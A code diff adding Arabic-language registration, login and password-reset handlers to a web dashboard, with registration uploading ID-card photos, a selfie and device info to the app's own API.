+    // إرسال طلب تسجيل مشترك جديد + الصور الثلاث (وجه البطاقة + ظهر البطاقة + الصورة الشخصية)
+    document.getElementById("registerForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+
+        if (!idFrontBase64) {
+            showAuthMessage("يرجى تصوير وجه البطاقة الشخصية أولاً.", false);
+            return;
+        }
+        if (!idBackBase64) {
+            showAuthMessage("يرجى تصوير ظهر البطاقة الشخصية أولاً.", false);
+            return;
+        }
+        if (!selfieBase64) {
+            showAuthMessage("يرجى التقاط صورة شخصية حديثة أولاً.", false);
+            return;
+        }
+
+        const btn = document.getElementById("regBtn");
+        btn.disabled = true;
+        btn.textContent = "جاري رفع الصور الثلاث والتحقق من الكود...";
+
+        try {
+            const deviceInfo = await collectClientTelemetry();
+            const res = await fetch(`${API_BASE}/api/auth/register`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    fullName: document.getElementById("regName").value.trim(),
+                    phone: document.getElementById("regPhone").value.trim(),
+                    password: document.getElementById("regPassword").value.trim(),
+                    otpCode: document.getElementById("regOtp").value.trim(),
+                    idFrontBase64,
+                    idBackBase64,
+                    selfieBase64,
+                    deviceInfo
+                })
+            });
+            const data = await res.json();
+            showAuthMessage(data.message, data.success);
+            if (data.success) {
+                document.getElementById("registerForm").reset();
+                ["previewIdFront", "previewIdBack", "previewSelfie"].forEach(id => {
+                    document.getElementById(id).style.display = "none";
+                });
+                ["boxIdFront", "boxIdBack", "boxSelfie"].forEach(id => {
+                    document.getElementById(id).classList.remove("has-file");
+                });
+                idFrontBase64 = "";
+                idBackBase64 = "";
+                selfieBase64 = "";
+            }
+        } catch {
+            showAuthMessage("حدث خطأ أثناء إرسال طلب التسجيل والمرفقات.", false);
+        } finally {
+            btn.disabled = false;
+            btn.textContent = "إرسال طلب التسجيل والمرفقات الثلاثة";
+        }
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById("loginBtn");
+        btn.disabled = true;
+        btn.textContent = "جاري تسجيل الدخول...";
+
+        try {
+            const res = await fetch(`${API_BASE}/api/auth/login`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    phone: document.getElementById("loginPhone").value.trim(),
+                    password: document.getElementById("loginPassword").value.trim()
+                })
+            });
+            const data = await res.json();
+            if (!data.success) {
+                showAuthMessage(data.message, false);
+                return;
+            }
+
+            authToken = data.token;
+            localStorage.setItem(TOKEN_KEY, authToken);
+            enterDashboard();
+        } catch {
+            showAuthMessage("تعذر الاتصال بالسيرفر.", false);
+        } finally {
+            btn.disabled = false;
+            btn.textContent = "دخول إلى لوحة عوائد حسابي";
+        }
+    });
+
+    document.getElementById("resetForm").addEventListener("submit", async (e) => {
+        e.preventDefault();
+        try {
+            const res = await fetch(`${API_BASE}/api/auth/reset-password`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    phone: document.getElementById("resetPhone").value.trim(),
+                    otpCode: document.getElementById("resetOtp").value.trim(),
+                    newPassword: document.getElementById("resetNewPassword").value.trim()
+                })
+            });
+            const data = await res.json();
+            showAuthMessage(data.message, data.success);
+            if (data.success) setTimeout(() => switchAuthTab("login"), 1500);
+        } catch {
+            showAuthMessage("تعذر الاتصال بالسيرفر.", false);
+        }
+    });
+
+    function enterDashboard() {
+        document.getElementById("authSection").style.display = "none";
+        document.getElementById("dashboardSection").style.display = "block";
+        syncWithServer();
+    }
+
+    function logoutUser() {
+        authToken = "";
+        localStorage.removeItem(TOKEN_KEY);
+        document.getElementById("dashboardSection").style.display = "none";
+        document.getElementById("authSection").style.display = "block";
     }
 
     function formatEgp(num) {
@@ -1232,7 +1709,7 @@
         if (e.key === "Enter") executeProtectedClear();
     });
 
-    syncWithServer();
+    if (authToken) enterDashboard();
     setInterval(syncWithServer, 4000);
 </script>
 </body>
